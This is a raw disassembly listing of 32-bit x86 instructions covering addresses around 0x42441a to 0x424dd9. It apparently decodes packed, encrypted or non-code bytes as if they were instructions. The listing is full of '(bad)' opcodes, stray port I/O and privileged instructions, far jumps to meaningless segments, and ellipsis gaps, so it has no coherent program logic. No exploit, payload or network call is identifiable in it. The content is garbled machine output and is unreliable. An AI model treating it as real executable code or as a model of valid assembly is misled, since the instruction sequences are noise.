  42441a:	push   ds
  42441b:	xchg   esp,eax
  42441c:	sti    
  42441d:	pusha  
  42441e:	je     0x4243f6
  424420:	dec    ecx
  424421:	or     eax,0xab7691ac
  424426:	and    BYTE PTR ds:0xd5780294,bh
  42442c:	sahf   
  42442d:	scas   eax,DWORD PTR es:[edi]
  42442e:	in     eax,0xb2
  424430:	inc    edx
  424431:	pop    ds
  424432:	ret    0x65a1
  424435:	mov    ah,0x95
  424437:	(bad)  
  424438:	call   0x65093292
  42443d:	push   0xffffffb9
  42443f:	adc    al,0xfc
  424441:	cmc    
  424442:	and    eax,0xdfec5550
  424447:	jmp    0x6392:0x25be3d09
  42444e:	cmp    BYTE PTR [eax-0x640bd31d],dh
  424454:	jge    0x4243ff
  424456:	imul   edi,DWORD PTR [edx+0x79],0x664d2d6
  42445d:	call   0x7da9:0xc0ad0b54
  424464:	pop    esi
  424465:	push   0xffffffca
  424467:	rcr    DWORD PTR [ebp+0x58],0x3a
  42446b:	inc    eax
  42446c:	in     al,0x16
  42446e:	(bad)  [ebp+0x67c17706]
  424474:	mov    bl,0x85
  424476:	jae    0x42444e
  424478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424479:	mov    ebp,0x7e80fcfd
  42447e:	stos   BYTE PTR es:[edi],al
  42447f:	and    DWORD PTR [ebp+eiz*2+0x78],ebp
  424483:	iret   
  424484:	inc    edx
  424485:	cmp    ch,BYTE PTR [edi+0x37771cfb]
  42448b:	(bad)  
  42448c:	fisub  DWORD PTR [ebx-0x79eb8d48]
  424492:	int3   
  424493:	xor    esi,ebx
  424495:	ins    DWORD PTR es:[edi],dx
  424496:	je     0x424455
  424498:	pusha  
  424499:	push   esp
  42449a:	test   al,0xfe
  42449c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42449d:	xadd   BYTE PTR [esi-0x3],bh
  4244a1:	ins    BYTE PTR es:[edi],dx
  4244a2:	mov    ch,0xde
  4244a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244a5:	mov    cl,0x2a
  4244a7:	ins    BYTE PTR es:[edi],dx
  4244a8:	sub    dl,bh
  4244aa:	sbb    eax,0x5745ae3f
  4244af:	xchg   BYTE PTR [ebp+edx*4-0x31],cl
  4244b3:	nop
  4244b4:	jno    0x424453
  4244b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244b7:	sub    cl,BYTE PTR [esi]
  4244b9:	int    0x92
  4244bb:	hlt    
  4244bc:	icebp  
  4244bd:	(bad)  
  4244be:	out    dx,eax
  4244bf:	aas    
  4244c0:	test   DWORD PTR [eax+edx*8],edi
  4244c3:	and    dh,bl
  4244c5:	add    dh,BYTE PTR [ebp-0x2e]
  4244c8:	and    BYTE PTR [eax],bl
  4244ca:	in     eax,dx
  4244cb:	jb     0x424464
  4244cd:	xchg   edi,eax
  4244ce:	pop    esi
  4244cf:	xor    ecx,DWORD PTR [ecx-0x25]
  4244d2:	xchg   esp,eax
  4244d3:	ret    0xadf
  4244d6:	int3   
  4244d7:	dec    eax
  4244d8:	nop
  4244d9:	iret   
  4244da:	imul   esi,DWORD PTR [ebx+0x6f],0x7e
  4244de:	sub    eax,0x65321bb7
  4244e3:	adc    BYTE PTR [ebx-0x1a],dl
  4244e6:	pop    edx
  4244e7:	(bad)  
  4244e8:	sbb    eax,0xd0a76e9
  4244ed:	mov    bh,0xd4
  4244ef:	sbb    ebx,esi
  4244f1:	scas   al,BYTE PTR es:[edi]
  4244f2:	ret    
  4244f3:	jg     0x42456d
  4244f5:	out    dx,eax
  4244f6:	mov    esi,0x911aaf57
  4244fb:	retf   
  4244fc:	dec    eax
  4244fd:	js     0x4244ff
  4244ff:	sbb    DWORD PTR [ebp+0x481eddb2],ebx
  424505:	into   
  424506:	mov    ecx,0x7ceccaa2
  42450b:	leave  
  42450c:	fdivr  st,st(6)
  42450e:	in     al,0x75
	...
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x2a],1
  424581:	jle    0x4245b8
  424583:	nop
  424584:	cwde   
  424585:	add    DWORD PTR [ecx],0x0
  424588:	add    al,0x1
  42458a:	add    BYTE PTR [eax],al
  42458c:	popa   
  42458d:	fwait
  42458e:	pop    es
  42458f:	outs   dx,DWORD PTR ds:[esi]
  424590:	xchg   esi,eax
  424591:	ins    BYTE PTR es:[edi],dx
  424592:	jae    0x424595
  424594:	adc    BYTE PTR [esi+0x2db92c41],cl
  42459a:	dec    edi
  42459b:	push   es
  42459c:	add    ebx,DWORD PTR [ebx-0x73fbda3e]
  4245a2:	mov    cl,0xfe
  4245a4:	ffree  st(1)
  4245a6:	adc    BYTE PTR [ecx-0x17],dh
  4245a9:	mov    ecx,0xde82d8b5
  4245ae:	test   al,0x52
  4245b0:	inc    esi
  4245b1:	in     eax,0xd4
  4245b3:	and    ecx,DWORD PTR [edx+0x383c7752]
  4245b9:	adc    ah,ch
  4245bb:	xor    BYTE PTR [eax+0x10],ah
  4245be:	ficom  DWORD PTR [esi]
  4245c0:	push   esi
  4245c1:	or     DWORD PTR [ebp-0x691ca70e],eax
  4245c7:	jge    0x42458f
  4245c9:	mov    ah,0x72
  4245cb:	jne    0x424586
  4245cd:	lods   al,BYTE PTR ds:[esi]
  4245ce:	mov    al,ds:0xc8f381b5
  4245d3:	dec    eax
  4245d4:	sub    ah,BYTE PTR [ebx-0x1ae02df1]
  4245da:	(bad)  
  4245db:	pusha  
  4245dc:	fdiv   st,st(0)
  4245de:	leave  
  4245df:	pop    eax
  4245e0:	xchg   ebp,eax
  4245e1:	mul    al
  4245e3:	pop    ds
  4245e4:	dec    esp
  4245e5:	in     eax,0x69
  4245e7:	fnstenv [ecx-0x41]
  4245ea:	repnz or dl,BYTE PTR [ecx+edx*4]
  4245ee:	pop    ds
  4245ef:	out    dx,eax
  4245f0:	js     0x424665
  4245f2:	mov    esp,0xe8b73cc1
  4245f7:	mov    dh,0xdd
  4245f9:	jbe    0x4245b7
  4245fb:	sub    esi,DWORD PTR [ebx+0x4a]
  4245fe:	dec    ebp
  4245ff:	cwde   
  424600:	jns    0x424676
  424602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424603:	shr    BYTE PTR [ebx+ecx*4+0x2b16f96b],1
  42460a:	stos   DWORD PTR es:[edi],eax
  42460b:	repz pop ebx
  42460d:	mov    ah,0xc
  42460f:	pop    ds
  424610:	cmp    al,0xf9
  424612:	dec    ebp
  424613:	push   eax
  424614:	rcr    BYTE PTR [ebp-0x45],cl
  424617:	(bad)  
  424618:	fist   DWORD PTR [esi-0x7750c158]
  42461e:	stos   DWORD PTR es:[edi],eax
  42461f:	loope  0x424677
  424621:	repz shl DWORD PTR [esi-0x4b1d3615],cl
  424628:	(bad)  [ecx+0x5]
  42462b:	or     al,0xed
  42462d:	pop    ecx
  42462e:	push   ecx
  42462f:	sub    al,0x70
  424631:	lods   al,BYTE PTR ds:[esi]
  424632:	mov    ah,0x1a
  424634:	xchg   esi,eax
  424635:	bound  ebx,QWORD PTR [ecx+0x46]
  424638:	mov    DWORD PTR [edx-0x285d108a],esi
  42463e:	dec    BYTE PTR ds:0xd6d4cc6d
  424644:	hlt    
  424645:	jmp    0x424666
  424647:	pop    esi
  424648:	imul   ebx,ebx,0xfffffff7
  42464b:	adc    DWORD PTR [ebx-0x3e6a3ebc],esp
  424651:	mov    DWORD PTR [eax-0x31],eax
  424654:	push   edx
  424655:	sub    al,0x90
  424657:	repnz xchg edx,eax
  424659:	and    ch,BYTE PTR [edx+esi*8+0x5a]
  42465d:	mov    WORD PTR [eax+0x1f],gs
  424660:	dec    edi
  424661:	jne    0x4246dd
  424663:	mov    ds:0xadcfd75b,eax
  424668:	xchg   ecx,eax
  424669:	add    al,0x51
  42466b:	mov    esp,0xf9a031bd
  424670:	inc    eax
  424671:	pop    ds
  424672:	ins    BYTE PTR es:[edi],dx
  424673:	cli    
  424674:	loope  0x424619
  424676:	or     dl,BYTE PTR ds:0xbf733e1f
  42467c:	xor    BYTE PTR [ebp-0x64],0x6b
  424680:	cmc    
  424681:	shr    BYTE PTR [esi+0x6c],1
  424684:	ror    esp,1
  424686:	xor    edi,eax
  424688:	xchg   ecx,eax
  424689:	push   eax
  42468a:	sbb    BYTE PTR [edx+0x2],bh
  42468d:	sti    
  42468e:	push   ebx
  42468f:	push   0x0
	...
  4246f1:	add    BYTE PTR [eax],al
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [eax-0x75],dh
  424702:	mov    esi,DWORD PTR [ecx+0x1849c]
  424708:	add    al,0x1
  42470a:	add    BYTE PTR [eax],al
  42470c:	or     BYTE PTR [ecx-0x61f5746a],ch
  424712:	or     edx,DWORD PTR [ebx+esi*4+0x6b76be2b]
  424719:	ds out dx,eax
  42471b:	lds    esp,FWORD PTR [ebx+0x26e9caa6]
  424721:	or     esp,ebp
  424723:	dec    edi
  424724:	(bad)  
  424726:	or     DWORD PTR [esi-0x2b],ebx
  424729:	xchg   ebx,eax
  42472a:	mov    ds:0xce1cd5fd,eax
  42472f:	cdq    
  424730:	scas   eax,DWORD PTR es:[edi]
  424731:	ds and eax,0x6b5dcefe
  424737:	(bad)  
  424738:	out    0x56,eax
  42473a:	sahf   
  42473b:	mov    ecx,0xf64b86b1
  424740:	sbb    bl,cl
  424742:	sub    DWORD PTR [ebp+0x6998f119],ebx
  424748:	rol    BYTE PTR [ecx],0xde
  42474b:	leave  
  42474c:	mov    dh,0x5d
  42474e:	and    DWORD PTR [eax-0x1d70e1ce],edx
  424754:	xchg   DWORD PTR [ebx+0x50e8c0b1],esp
  42475a:	sbb    DWORD PTR [ecx+0x4d68c202],edx
  424760:	dec    ecx
  424761:	daa    
  424762:	lods   al,BYTE PTR ds:[esi]
  424763:	call   0xabd:0x46c3b47a
  42476a:	sbb    edx,esp
  42476c:	adc    eax,0x86261876
  424771:	jbe    0x4247d3
  424773:	in     eax,0x82
  424775:	out    dx,eax
  424776:	mov    esp,0xd12e1c7e
  42477b:	pop    ds
  42477c:	mov    ebp,DWORD PTR [ebp+0x370b414d]
  424782:	in     al,0xdd
  424784:	hlt    
  424785:	pop    ecx
  424786:	clc    
  424787:	retf   0xe0db
  42478a:	in     eax,dx
  42478b:	hlt    
  42478c:	push   ds
  42478d:	mov    DWORD PTR [eax-0x6],edi
  424790:	popf   
  424791:	mov    DWORD PTR [ebp-0x72728a97],0x89f35d5a
  42479b:	jp     0x4247e0
  42479d:	imul   esi,DWORD PTR [ebp+0x40630c0d],0x1
  4247a4:	sub    esp,0xfffffffb
  4247a7:	mov    eax,ds:0x1adc0a79
  4247ac:	aam    0xd0
  4247ae:	adc    BYTE PTR [ecx],dl
  4247b0:	jnp    0x4247e1
  4247b2:	sti    
  4247b3:	fwait
  4247b4:	xor    eax,0xd1c0c42c
  4247b9:	push   ebp
  4247ba:	inc    edx
  4247bb:	dec    ebp
  4247bd:	lds    ebx,FWORD PTR [eax]
  4247bf:	rcr    BYTE PTR [eax],cl
  4247c1:	push   ebp
  4247c2:	(bad)  
  4247c3:	loop   0x424777
  4247c5:	pop    ds
  4247c6:	jns    0x424834
  4247c8:	push   0x8967fde
  4247cd:	not    DWORD PTR [edi-0x1a52bc06]
  4247d3:	aas    
  4247d4:	repnz sti 
  4247d6:	mov    al,ds:0xc60231bc
  4247db:	test   ch,al
  4247dd:	push   cs
  4247de:	dec    ebp
  4247df:	and    BYTE PTR [edi+0x48c716e2],dh
  4247e5:	bound  edi,QWORD PTR [ebp-0x24]
  4247e8:	ror    BYTE PTR [eax-0x7b],1
  4247eb:	push   0xffffffef
  4247ed:	dec    BYTE PTR [edx-0x7]
  4247f0:	cmp    edi,DWORD PTR [edi+0x42fc3ea]
  4247f6:	and    BYTE PTR [eax+ecx*4],ch
  4247f9:	push   esp
  4247fa:	enter  0x6a58,0x3e
  4247fe:	jmp    0x4247ce
  424800:	bound  eax,QWORD PTR [edi+0x18]
  424803:	push   es
  424804:	adc    BYTE PTR [esi],0x25
  424807:	mov    eax,0x65d955ed
  42480c:	mov    WORD PTR [eax+0x5e],ds
  42480f:	jge    0x424811
	...
  424871:	add    BYTE PTR [eax],al
  424873:	add    BYTE PTR [edx],ah
  424875:	pop    eax
  424876:	test   bh,ch
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	dec    ebx
  424881:	aad    0x28
  424883:	inc    esi
  424884:	mov    al,ds:0x4000185
  424889:	add    DWORD PTR [eax],eax
  42488b:	add    dh,bh
  42488d:	push   edx
  42488e:	dec    ch
  424890:	xchg   DWORD PTR [ebx],ebp
  424892:	xchg   esi,eax
  424893:	popf   
  424894:	sbb    ecx,esp
  424896:	popa   
  424897:	popf   
  424898:	xchg   edx,eax
  424899:	cwde   
  42489a:	xor    DWORD PTR [ebp-0x63],ecx
  42489d:	push   ebx
  42489e:	adc    BYTE PTR [edx+0x2a],cl
  4248a1:	pop    es
  4248a2:	dec    ecx
  4248a3:	jmp    FWORD PTR [edx-0x6a]
  4248a6:	test   eax,0xfb763677
  4248ab:	and    al,0x9f
  4248ad:	int3   
  4248ae:	out    dx,eax
  4248af:	cdq    
  4248b0:	jmp    0x6ac3:0x694b6a3d
  4248b7:	pop    edi
  4248b8:	and    eax,0x1ea4f625
  4248bd:	jecxz  0x4248ab
  4248bf:	(bad)  
  4248c0:	lods   al,BYTE PTR ds:[esi]
  4248c1:	mov    ds:0x6ef70b78,eax
  4248c6:	jo     0x4248a2
  4248c8:	hlt    
  4248c9:	icebp  
  4248ca:	in     al,0x5e
  4248cc:	aas    
  4248cd:	(bad)  
  4248ce:	fcmovne st,st(3)
  4248d0:	scas   ax,WORD PTR es:[edi]
  4248d2:	mov    ebp,0xbf8ebce1
  4248d7:	inc    edi
  4248d8:	adc    eax,0x8ebf819e
  4248dd:	in     eax,dx
  4248de:	dec    ecx
  4248df:	les    esi,FWORD PTR [ebp-0x7d4dc145]
  4248e5:	xchg   ecx,eax
  4248e6:	loope  0x4248cd
  4248e8:	cwde   
  4248e9:	scas   eax,DWORD PTR es:[edi]
  4248ea:	in     al,0x77
  4248ec:	cld    
  4248ed:	add    ecx,edx
  4248ef:	arpl   WORD PTR [edx+0x6d39f413],sp
  4248f5:	jae    0x42491f
  4248f7:	inc    eax
  4248f8:	fs push ss
  4248fa:	jne    0x4248ae
  4248fc:	nop
  4248fd:	fwait
  4248fe:	push   ss
  4248ff:	cdq    
  424900:	outs   dx,DWORD PTR ds:[esi]
  424901:	inc    edx
  424902:	xor    BYTE PTR [edi-0x26],ah
  424905:	pop    eax
  424906:	and    BYTE PTR [ebx],ch
  424908:	stos   DWORD PTR es:[edi],eax
  424909:	stos   BYTE PTR es:[edi],al
  42490a:	mov    al,ds:0x8efb8d02
  42490f:	inc    edx
  424910:	xchg   esp,eax
  424911:	lods   eax,DWORD PTR ds:[esi]
  424912:	fild   WORD PTR ss:[ebx+0x76]
  424916:	cmp    eax,0x27de8aa
  42491b:	cmp    bl,BYTE PTR [eax]
  42491d:	dec    ebx
  42491e:	jnp    0x42494e
  424920:	(bad)  
  424921:	jbe    0x4248b3
  424923:	test   al,0x60
  424925:	xor    edi,esp
  424927:	pop    ebx
  424928:	jns    0x42499c
  42492a:	mov    bl,BYTE PTR [ebx-0x1b7357a2]
  424930:	pop    esi
  424931:	arpl   WORD PTR [edi-0x6],dx
  424934:	inc    edx
  424935:	pop    ds
  424936:	jge    0x424909
  424938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424939:	aaa    
  42493a:	out    dx,al
  42493b:	jle    0x424918
  42493d:	pop    edi
  42493e:	call   0x67c2:0x115faab
  424945:	int    0x73
  424947:	dec    DWORD PTR [esi]
  424949:	ja     0x424939
  42494b:	cli    
  42494c:	sbb    BYTE PTR [esi+ebp*1-0x24f1cdc5],0x9c
  424954:	and    edi,DWORD PTR [ebp+0xcd4f204]
  42495a:	dec    DWORD PTR [ebx-0x3d04cca9]
  424960:	pop    ecx
  424961:	lods   eax,DWORD PTR ds:[esi]
  424962:	xchg   edi,eax
  424963:	push   0x9035818d
  424968:	ja     0x424925
  42496a:	cli    
  42496b:	and    BYTE PTR [ebx+0x65],ch
  42496e:	ss int3 
  424970:	mov    esp,0x375bedd5
  424975:	stos   BYTE PTR es:[edi],al
  424976:	and    DWORD PTR [edi],ecx
  424978:	call   0x3a04:0x50fe8797
  42497f:	and    bl,bh
  424981:	or     al,0x32
  424983:	cmp    eax,0x5d5475fd
  424988:	mov    ebx,DWORD PTR [edx+0x631e93e8]
  42498e:	not    DWORD PTR [edx+0x0]
	...
  4249f1:	add    BYTE PTR [eax],al
  4249f3:	add    BYTE PTR [ebx+0x18],ch
  4249f6:	arpl   WORD PTR [edx+0x73],bp
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    dl,BYTE PTR [edi]
  424a01:	fisttp DWORD PTR [ecx-0x71]
  424a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a05:	xchg   BYTE PTR [ecx],al
  424a07:	add    BYTE PTR [ecx+eax*1],al
  424a0a:	add    BYTE PTR [eax],al
  424a0c:	outs   dx,BYTE PTR ds:[esi]
  424a0d:	rcr    DWORD PTR [edx],0xdb
  424a10:	test   al,0xf6
  424a12:	pop    ds
  424a13:	or     bl,BYTE PTR [esi-0x63dfa55b]
  424a19:	loope  0x424a55
  424a1b:	hlt    
  424a1c:	or     eax,0x97b41a9e
  424a21:	repnz and ch,bl
  424a24:	bound  esi,QWORD PTR [ecx+0x79]
  424a27:	ins    BYTE PTR es:[edi],dx
  424a28:	(bad)  
  424a29:	dec    eax
  424a2a:	sbb    BYTE PTR [ebp-0x2b],cl
  424a2d:	cs push esi
  424a2f:	pop    esi
  424a30:	ins    BYTE PTR es:[edi],dx
  424a31:	jb     0x424a57
  424a33:	cmp    eax,0xac6eb673
  424a38:	mov    dh,0x3c
  424a3a:	stos   BYTE PTR es:[edi],al
  424a3b:	aas    
  424a3c:	push   ebx
  424a3d:	adc    al,dh
  424a3f:	cmp    BYTE PTR [edx],bl
  424a41:	sbb    al,0x7b
  424a43:	cmp    DWORD PTR [esi-0x2f],edx
  424a46:	and    BYTE PTR [si],bh
  424a49:	xchg   edi,ebp
  424a4b:	mov    ds:0xf4aaf12c,eax
  424a50:	add    BYTE PTR [ebx+0x398d4472],bl
  424a56:	gs and ebx,edi
  424a59:	pop    esi
  424a5a:	and    dl,BYTE PTR [esi+edi*8]
  424a5d:	cmp    ch,BYTE PTR [ecx+0x1a77ed57]
  424a63:	jb     0x424a0b
  424a65:	(bad)  
  424a66:	fdivr  DWORD PTR [ecx-0x490c4566]
  424a6c:	inc    edx
  424a6d:	and    esp,DWORD PTR [eax+0x22]
  424a70:	(bad)  
  424a73:	ror    BYTE PTR [ebp+0x36],cl
  424a76:	sbb    al,0x97
  424a78:	outs   dx,DWORD PTR es:[esi]
  424a7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a7b:	push   0xffffff82
  424a7d:	sar    DWORD PTR [edi],cl
  424a7f:	add    BYTE PTR [edx+0x41],dh
  424a82:	loopne 0x424a25
  424a84:	lea    esi,[ecx-0x18]
  424a87:	addr16 call 0x5c421024
  424a8d:	inc    ebp
  424a8e:	push   ebp
  424a8f:	push   edi
  424a90:	stos   BYTE PTR es:[edi],al
  424a91:	mov    ecx,0x1e855c6
  424a96:	fdiv   DWORD PTR [edx]
  424a98:	mov    ds:0x15354e2,al
  424a9d:	rcl    BYTE PTR [edx+0x11],cl
  424aa0:	mov    ecx,0xcac92161
  424aa5:	fwait
  424aa6:	arpl   WORD PTR [ebx+0x29],bx
  424aa9:	or     bl,0x50
  424aac:	fst    st(3)
  424aae:	add    esp,esp
  424ab0:	in     al,0xbc
  424ab2:	mov    WORD PTR [ebp+0x7],fs
  424ab5:	in     eax,0x41
  424ab7:	(bad)  
  424ab8:	jnp    0x424abb
  424aba:	dec    ebp
  424abb:	mov    ebx,0xee4978d8
  424ac0:	test   DWORD PTR [edi-0x6de25bc4],esp
  424ac6:	inc    ecx
  424ac7:	(bad)  
  424ac8:	retf   0x4273
  424acb:	xor    eax,0x3c3dedc3
  424ad0:	inc    esi
  424ad1:	pushf  
  424ad2:	pushf  
  424ad3:	rcr    DWORD PTR [esp+eiz*8+0x7c],cl
  424ad7:	sub    ebx,DWORD PTR [ebp+0x434ac5c5]
  424add:	or     DWORD PTR [esi],esp
  424adf:	pop    ecx
  424ae0:	fwait
  424ae1:	sub    edx,esp
  424ae3:	pusha  
  424ae4:	inc    ebp
  424ae5:	inc    eax
  424ae6:	mov    bh,0xa5
  424ae8:	bound  edi,QWORD PTR [eax+0x2012ca45]
  424aee:	out    dx,al
  424aef:	cmc    
  424af0:	mov    ch,0x60
  424af2:	shr    ah,1
  424af4:	test   BYTE PTR [eax-0x76],cl
  424af7:	mov    ebx,0xcbbecfc4
  424afc:	xchg   ecx,eax
  424afd:	int3   
  424afe:	xor    eax,DWORD PTR [edi]
  424b00:	xor    BYTE PTR [eax],dl
  424b02:	inc    edx
  424b03:	xchg   BYTE PTR [ecx+0x57],bl
  424b06:	loopne 0x424aeb
  424b08:	lods   eax,DWORD PTR ds:[esi]
  424b09:	loope  0x424b5b
  424b0b:	jne    0x424b07
  424b0d:	sbb    al,0x25
  424b0f:	jnp    0x424b11
	...
  424b71:	add    BYTE PTR [eax],al
  424b73:	add    BYTE PTR [esi],al
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	fabs   
  424b82:	dec    eax
  424b83:	pop    edi
  424b84:	test   al,0x87
  424b86:	add    DWORD PTR [eax],eax
  424b88:	add    al,0x1
  424b8a:	add    BYTE PTR [eax],al
  424b8c:	xor    dh,cl
  424b8e:	pop    ecx
  424b8f:	daa    
  424b90:	mov    esp,0xd18c465
  424b95:	test   BYTE PTR [ebx+eax*1-0x7],bh
  424b99:	gs gs call 0x10a7:0xdb7d58a3
  424ba2:	sar    DWORD PTR [edi+eax*8],cl
  424ba5:	jmp    0x476b:0xab9f9ca5
  424bac:	xchg   DWORD PTR [eax+ecx*2],eax
  424baf:	pop    ebp
  424bb0:	sub    eax,0xec5f4f66
  424bb5:	mov    esi,esp
  424bb7:	jae    0x424bd2
  424bb9:	fmul   QWORD PTR [esi-0x2d]
  424bbc:	add    eax,DWORD PTR [eax]
  424bbe:	mov    dh,0x4
  424bc0:	pop    ebx
  424bc1:	loopne 0x424bb9
  424bc3:	sbb    DWORD PTR es:[ebp*8+0x5bb012a9],ebx
  424bcb:	and    ch,BYTE PTR [ebp+0x4f]
  424bce:	icebp  
  424bcf:	mov    al,0xfa
  424bd1:	jbe    0x424b99
  424bd3:	(bad)  
  424bd4:	fcom   DWORD PTR [edx+0x79]
  424bd7:	xlat   BYTE PTR ds:[ebx]
  424bd8:	test   BYTE PTR [eax+0x1f],al
  424bdb:	fstp   QWORD PTR [esi+ebx*2]
  424bde:	pop    edi
  424bdf:	imul   esp,DWORD PTR [ebp-0x1],0x5c
  424be3:	mov    edi,?
  424be5:	test   eax,0xaed0cb33
  424bea:	out    0xad,al
  424bec:	mov    ebp,0x9f8664f2
  424bf1:	adc    ch,cl
  424bf3:	sar    DWORD PTR [edi],cl
  424bf5:	xchg   esi,eax
  424bf6:	bound  ebp,QWORD PTR [ecx+0x27]
  424bf9:	cmp    al,0x2c
  424bfb:	popa   
  424bfc:	iret   
  424bfd:	xor    al,BYTE PTR [esi]
  424bff:	mov    WORD PTR [ecx+0x74],ds
  424c02:	out    0xe2,eax
  424c04:	add    eax,0x1d25fc7
  424c09:	xchg   esi,eax
  424c0a:	scas   eax,DWORD PTR es:[edi]
  424c0b:	mov    eax,0x4c9b3373
  424c10:	popa   
  424c11:	inc    edi
  424c12:	and    ebp,esp
  424c14:	push   ebx
  424c15:	pushaw 
  424c17:	mov    ecx,0xdf74ef16
  424c1c:	fwait
  424c1d:	iret   
  424c1e:	pop    edi
  424c1f:	dec    esp
  424c20:	cmp    BYTE PTR [edx+0x735dcb1a],dh
  424c26:	int3   
  424c27:	sbb    al,0x70
  424c29:	xchg   ecx,eax
  424c2a:	push   esp
  424c2b:	xor    DWORD PTR [ecx],0xffffffd0
  424c2e:	or     eax,edi
  424c30:	add    BYTE PTR [ebx+0x4e],ah
  424c33:	adc    al,0xf7
  424c35:	es jno 0x424c3e
  424c38:	mov    WORD PTR [ecx+0x4c2af1fa],fs
  424c3e:	aam    0xd5
  424c40:	aad    0x4a
  424c42:	ins    DWORD PTR es:[edi],dx
  424c43:	pop    edx
  424c44:	stos   BYTE PTR es:[edi],al
  424c45:	and    BYTE PTR [edx+0x7f],cl
  424c48:	adc    BYTE PTR [eax-0x22],ah
  424c4b:	ret    0x2240
  424c4e:	jp     0x424c3a
  424c50:	push   edx
  424c51:	cmp    DWORD PTR [eax-0x6c],ecx
  424c54:	push   es
  424c55:	or     DWORD PTR [eax],eax
  424c57:	scas   eax,DWORD PTR es:[edi]
  424c58:	fdiv   DWORD PTR [edi-0x4b25505]
  424c5e:	lds    esi,FWORD PTR [edx+0x15967ff7]
  424c64:	scas   al,BYTE PTR es:[edi]
  424c65:	hlt    
  424c66:	mov    eax,ds:0x589e13ea
  424c6b:	jl     0x424bed
  424c6d:	cmp    BYTE PTR [edx-0x6d],dl
  424c70:	(bad)  
  424c71:	cmp    DWORD PTR [ebx-0x3a],ebp
  424c74:	ret    
  424c75:	lock inc esi
  424c77:	pop    ebx
  424c78:	jbe    0x424cd6
  424c7a:	aam    0xdf
  424c7c:	pop    ebx
  424c7d:	inc    DWORD PTR [ebp+ecx*2+0x12]
  424c81:	mov    ch,cl
  424c83:	(bad)
  424c86:	fbstp  TBYTE PTR [esi]
  424c88:	and    al,0xaf
  424c8a:	bound  esp,QWORD PTR [esi-0x5b]
  424c8d:	lods   al,BYTE PTR ds:[esi]
  424c8e:	lea    ecx,[eax+eax*1+0x0]
	...
  424cf2:	add    BYTE PTR [eax],al
  424cf4:	ins    BYTE PTR es:[edi],dx
  424cf5:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424cfc:	bound  ebx,QWORD PTR [ebx-0x5faae58]
  424d02:	sub    dl,BYTE PTR [ebx]
  424d04:	lods   al,BYTE PTR ds:[esi]
  424d05:	mov    BYTE PTR [ecx],al
  424d07:	add    BYTE PTR [ecx+eax*1],al
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	test   esi,esp
  424d0e:	xchg   ecx,eax
  424d0f:	pop    esi
  424d10:	push   edi
  424d11:	adc    BYTE PTR [esi+0x46],bh
  424d14:	mov    al,ds:0xaeab7983
  424d19:	pushf  
  424d1a:	std    
  424d1b:	loop   0x424d2e
  424d1d:	or     DWORD PTR [eax-0xf],0x33b1ea86
  424d24:	pop    ebx
  424d25:	jge    0x424cfc
  424d27:	pop    esp
  424d28:	inc    esi
  424d29:	ret    0xa872
  424d2c:	add    al,0x9f
  424d2e:	mov    ebp,0xa6c740a5
  424d33:	js     0x424d3d
  424d35:	imul   DWORD PTR [edi+0x27]
  424d38:	retf   0xe7d1
  424d3b:	push   ebp
  424d3c:	mov    edi,0xea64d83c
  424d41:	cmc    
  424d42:	jbe    0x424d26
  424d44:	ins    DWORD PTR es:[edi],dx
  424d45:	je     0x424d43
  424d47:	jg     0x424d08
  424d49:	cmp    eax,0x21959cc
  424d4e:	mov    ecx,0xa1b7028d
  424d53:	jle    0x309b44c7
  424d59:	inc    ecx
  424d5a:	aad    0xb5
  424d5c:	dec    edi
  424d5d:	daa    
  424d5e:	pusha  
  424d5f:	push   0x76fe07eb
  424d64:	setno  BYTE PTR [esi+0x91529d2]
  424d6b:	push   esi
  424d6c:	mov    bh,dl
  424d6e:	add    edx,DWORD PTR [ebp+0x7a]
  424d71:	jmp    0xee4b9c41
  424d76:	lock dec ebp
  424d78:	cwde   
  424d79:	mov    ebx,0x597ebd9c
  424d7e:	and    BYTE PTR [ebp-0x7d990795],bh
  424d84:	sub    BYTE PTR [eax-0x9d5110a],ch
  424d8a:	jge    0x424d66
  424d8c:	xor    ecx,DWORD PTR ds:[esi-0x57]
  424d90:	fcomp  DWORD PTR [edx+0x4096a99b]
  424d96:	scas   eax,DWORD PTR es:[edi]
  424d97:	shl    esp,0xe1
  424d9a:	(bad)  
  424d9b:	rcl    DWORD PTR [ebx-0x567afbb1],cl
  424da1:	ins    BYTE PTR es:[edi],dx
  424da2:	jg     0x424d4e
  424da4:	sbb    al,0xfc
  424da6:	mov    eax,ds:0x1934cd55
  424dab:	test   DWORD PTR [edx+esi*1],0xaec5f84c
  424db2:	pop    eax
  424db3:	fcom   DWORD PTR [edi]
  424db5:	rcr    dh,cl
  424db7:	outs   dx,BYTE PTR ds:[esi]
  424db8:	sbb    DWORD PTR [ebx-0x3],ebx
  424dbb:	enter  0x39b3,0xb0
  424dbf:	ja     0x424e18
  424dc1:	mov    bl,0x3b
  424dc3:	outs   dx,BYTE PTR ds:[esi]
  424dc4:	or     al,0x5
  424dc6:	ss push ecx
  424dc8:	addr16 inc esp
  424dca:	pop    esi
  424dcb:	aas    
  424dcc:	add    eax,0x4152eb42
  424dd1:	popf   
  424dd2:	xchg   edx,eax
  424dd3:	btc    edx,0xa1
  424dd7:	sub    al,0xf5
  424dd9:	lods   eax,DWORD PTR ds:[esi]
